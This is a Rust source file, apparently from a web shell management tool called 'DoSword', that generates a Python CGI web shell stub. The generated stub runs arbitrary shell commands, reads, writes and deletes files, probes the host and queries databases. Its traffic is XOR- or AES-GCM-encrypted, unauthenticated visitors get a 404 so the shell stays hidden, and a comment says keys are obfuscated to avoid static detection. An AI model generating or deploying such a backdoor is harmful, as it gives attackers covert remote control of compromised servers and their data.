//! Python stub 模板（NativeEncoder 的 python 分支）。
//! 载荷协议与 PHP native / JSP 完全一致：XOR 加密 + md5 哈希分发
//! + formData 参数 + X-Debug-Key 头鉴权（CGI 环境）。

/// Python stub：CGI 脚本，命令 / 文件 / 探测，无 DB。
#[allow(clippy::too_many_arguments)]
pub fn python_stub(
    xk: &str,
    gk_hex: &str,
    token_hex: &str,
    key_hex: &str,
    h_probe: &str,
    h_exec: &str,
    h_list: &str,
    h_read: &str,
    h_write: &str,
    h_delete: &str,
    h_rename: &str,
    h_mkdir: &str,
    h_touch: &str,
    h_dbprobe: &str,
    h_dbquery: &str,
    aead_ikm: Option<&str>,
) -> String {
    let (codec_helpers, codec_decode, codec_encode) = match aead_ikm {
        Some(ikm) => (
            r#"import hmac as _hmac, secrets as _secrets, tempfile as _tempfile
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AESGCM
except Exception:
    _AESGCM = None
_IKM = bytes.fromhex(dsw_dec('{IKMX}', _XK))
def _dsw_hkdf(ikm):
    _prk = _hmac.new(b'dosword/aead/v2', ikm, hashlib.sha256).digest()
    return _hmac.new(_prk, b'dsw2' + b'\x01', hashlib.sha256).digest()
_AKEY = _dsw_hkdf(_IKM)
def _dsw_aad(d, seqb):
    return b'dsw2' + bytes([d]) + seqb
def _dsw_state_path(sid):
    return os.path.join(_tempfile.gettempdir(), '.dsw_a_' + hashlib.md5(_AKEY).hexdigest()[:8] + '_' + sid)
def dsw_aead_open(b64):
    if _AESGCM is None:
        raise RuntimeError('cryptography 未安装（AEAD stub 依赖）')
    f = base64.b64decode(b64 or '')
    if len(f) < 36:
        raise ValueError('bad frame')
    nonce, sb, rest = f[:12], f[12:20], f[20:]
    seq = int.from_bytes(sb, 'big')
    sid = nonce[:8].hex()
    path = _dsw_state_path(sid)
    try:
        with open(path, 'r') as fh:
            last = int((fh.read() or '0').strip() or 0)
    except Exception:
        last = 0
    if last and seq <= last:
        raise ValueError('replay')
    plain = _AESGCM(_AKEY).decrypt(nonce, rest, _dsw_aad(1, sb))
    try:
        with open(path, 'w') as fh:
            fh.write(str(seq))
    except Exception:
        pass
    return plain
def dsw_aead_seal(data):
    if _AESGCM is None:
        raise RuntimeError('cryptography 未安装（AEAD stub 依赖）')
    nonce = _secrets.token_bytes(12)
    sb = int(time.monotonic_ns()).to_bytes(8, 'big')
    return base64.b64encode(nonce + sb + _AESGCM(_AKEY).encrypt(nonce, data, _dsw_aad(2, sb))).decode()"#
            // IKM（= SHA256(密码) 的十六进制）以 XOR 形式嵌入：避免静态特征直接命中
            .replace("{IKMX}", &crate::encoder::xor_hex(ikm, xk))
            .to_string(),
            "dsw_aead_open(_raw)".to_string(),
            "dsw_aead_seal".to_string(),
        ),
        None => (
            format!(
                "_K = dsw_dec('{key_hex}', _XK).encode('utf-8')\ndef dsw_x(d):\n    return bytes(b ^ _K[i % len(_K)] for i, b in enumerate(d))\ndef dsw_encode(data):\n    return base64.b64encode(dsw_x(data)).decode()",
                key_hex = key_hex
            ),
            "dsw_x(base64.b64decode(_raw))".to_string(),
            "dsw_encode".to_string(),
        ),
    };
    format!(
        r#"#!/usr/bin/env python3
# DoSword generated stub (python, xor)
import base64, hashlib, json, os, platform, shutil, subprocess, sys, time, urllib.parse

_XK = '{xk}'
def dsw_dec(hexstr, k):
    return ''.join(chr(int(hexstr[i:i + 2], 16) ^ ord(k[(i // 2) % len(k)])) for i in range(0, len(hexstr), 2))
{codec_helpers}
def dsw_h(op):
    return str(int(hashlib.md5(op.encode()).hexdigest()[:8], 16))
_H = {{
    'probe': '{h_probe}', 'exec': '{h_exec}', 'list': '{h_list}',
    'read': '{h_read}', 'write': '{h_write}', 'delete': '{h_delete}',
    'rename': '{h_rename}', 'mkdir': '{h_mkdir}', 'touch': '{h_touch}',
    'dbprobe': '{h_dbprobe}', 'dbquery': '{h_dbquery}',
}}
_decode_error = ''
try:
    _body = sys.stdin.read(int(os.environ.get('CONTENT_LENGTH', '0') or 0))
    _raw = urllib.parse.parse_qs(_body).get('formData', [''])[0]
    req = json.loads({codec_decode}.decode('utf-8', 'replace'))
except Exception as _e:
    req = {{}}
    _decode_error = str(_e)
if _decode_error:
    # 解包/解密失败（含重放）：返回可解密的错误帧，便于客户端定位
    print('Content-Type: application/json')
    print()
    print(json.dumps({{'data': {codec_encode}(json.dumps({{'ok': False, 'error': 'decode: ' + _decode_error}}).encode()), 'code': 200}}))
    sys.exit(0)
# S12：鉴权——请求体内嵌 token 必须匹配（缺失或不匹配即 404）
if req.get('token', '') != dsw_dec('{token_hex}', _XK):
    print('Status: 404 Not Found')
    print()
    sys.exit(0)
a = req.get('a', '')
out = {{'ok': True, 'data': {{}}}}
try:
    h = dsw_h(a)
    if h == _H['probe']:
        out['data'] = {{
            'server': ' '.join(platform.uname()[0:3]),
            'web_server': os.environ.get('SERVER_SOFTWARE', ''),
            'php_version': 'Python ' + sys.version.split()[0],
            'current_dir': os.getcwd(),
            'separator': os.sep,
            'php_sapi': 'python-cgi',
            'arch': platform.machine(),
            'extensions': [],
            'disable_functions': '',
            'info': {{
                'ProtoVersion': '2',
                'Capabilities': 'chunked,stream,db,plugin,exec',
                'ShellType': 'file',
                'OsInfo': ' '.join(platform.uname()),
                'CurrentUser': os.environ.get('USER', ''),
                'CurrentDir': os.getcwd(),
                'FileRoot': os.path.dirname(os.path.abspath(__file__)),
                'Python': sys.version.split()[0],
                'Platform': platform.platform(),
            }},
        }}
    elif h == _H['exec']:
        c = req.get('c', ''); w = req.get('w', '')
        if w and os.path.isdir(w):
            os.chdir(w)
        if c.startswith('cd '):
            d = c[3:].strip().strip('"').strip("'")
            if d:
                os.chdir(d)
            out['data'] = {{'stdout': '', 'cwd': os.getcwd()}}
        else:
            p = subprocess.run(c + ' 2>&1', shell=True, capture_output=True)
            out['data'] = {{'stdout': base64.b64encode(p.stdout).decode(), 'cwd': os.getcwd()}}
    elif h == _H['list']:
        p = req.get('p', '.')
        entries = []
        for f in sorted(os.listdir(p)):
            fp = os.path.join(p, f)
            st = os.stat(fp)
            entries.append({{
                'name': f, 'path': fp, 'is_dir': os.path.isdir(fp),
                'size': st.st_size if os.path.isfile(fp) else 0,
                'mtime': int(st.st_mtime), 'perms': oct(st.st_mode & 0o777)[2:],
            }})
        out['data'] = {{'entries': entries}}
    elif h == _H['read']:
        _o = int(req.get('o', 0) or 0)
        _l = int(req.get('l', 0) or 0)
        with open(req.get('p', ''), 'rb') as f:
            f.seek(_o)
            _chunk = f.read(_l) if _l > 0 else f.read()
            out['data'] = base64.b64encode(_chunk).decode()
    elif h == _H['write']:
        _o = int(req.get('o', 0) or 0)
        _data = base64.b64decode(req.get('d', ''))
        if _o > 0:
            # 分块写：r+b 定位覆盖
            with open(req.get('p', ''), 'r+b') as f:
                f.seek(_o)
                f.write(_data)
        else:
            with open(req.get('p', ''), 'wb') as f:
                f.write(_data)
    elif h == _H['delete']:
        p = req.get('p', '')
        if os.path.isdir(p) and not os.path.islink(p):
            shutil.rmtree(p)
        else:
            os.remove(p)
    elif h == _H['rename']:
        os.rename(req.get('f', ''), req.get('t', ''))
    elif h == _H['mkdir']:
        os.makedirs(req.get('p', ''), exist_ok=True)
    elif h == _H['touch']:
        t = int(req.get('t', 0)) or int(time.time())
        os.utime(req.get('p', ''), (t, t))
    elif h == _H['dbprobe']:
        _c = json.loads(req.get('c', '{{}}'))
        _drv = _c.get('driver', '')
        if _drv == 'sqlite':
            import sqlite3 as _s
            _conn = _s.connect(_c.get('dbname') or ':memory:', isolation_level=None)
            _cur = _conn.cursor()
            _cur.execute("SELECT name FROM sqlite_master WHERE type='table' UNION SELECT 'main'")
            out['data'] = {{'databases': [r[0] for r in _cur.fetchall()]}}
            _conn.close()
        elif _drv == 'mysql':
            try:
                import mysql.connector as _m
                _conn = _m.connect(host=_c.get('host', '127.0.0.1'), port=int(_c.get('port') or 3306), user=_c.get('username', ''), password=_c.get('password', ''))
                _cur = _conn.cursor(); _cur.execute("SHOW DATABASES")
                out['data'] = {{'databases': [r[0] for r in _cur.fetchall()]}}
                _conn.close()
            except Exception as _me:
                out = {{'ok': False, 'error': 'mysql: ' + str(_me)}}
        else:
            out = {{'ok': False, 'error': 'unsupported driver ' + _drv}}
    elif h == _H['dbquery']:
        _c = json.loads(req.get('c', '{{}}'))
        if _c.get('driver') != 'sqlite':
            out = {{'ok': False, 'error': 'dbquery 仅支持 sqlite（Python 端）'}}
        else:
            import sqlite3 as _s
            _conn = _s.connect(_c.get('dbname') or ':memory:', isolation_level=None)
            _cur = _conn.cursor()
            try:
                _cur.execute(req.get('q', ''))
                if _cur.description:
                    _cols = [d[0] for d in _cur.description]
                    _rows = [[None if v is None else str(v) for v in r] for r in _cur.fetchall()]
                    out['data'] = {{'columns': _cols, 'rows': _rows, 'affected': 0}}
                else:
                    out['data'] = {{'columns': [], 'rows': [], 'affected': _conn.total_changes}}
            except Exception as _qe:
                out = {{'ok': False, 'error': str(_qe)}}
            _conn.close()
except Exception as e:
    out = {{'ok': False, 'error': str(e)}}
print('Content-Type: application/json')
print()
print(json.dumps({{
    'data': {codec_encode}(json.dumps(out).encode()),
    'code': 200,
}}))
"#,
        h_probe = h_probe,
        h_exec = h_exec,
        h_list = h_list,
        h_read = h_read,
        h_write = h_write,
        h_delete = h_delete,
        h_rename = h_rename,
        h_mkdir = h_mkdir,
        h_touch = h_touch,
        h_dbprobe = h_dbprobe,
        h_dbquery = h_dbquery,
        codec_helpers = codec_helpers,
        codec_decode = codec_decode,
        codec_encode = codec_encode,
    )
    .replace("{xk}", xk)
    .replace("{gk_hex}", gk_hex)
    .replace("{token_hex}", token_hex)
}
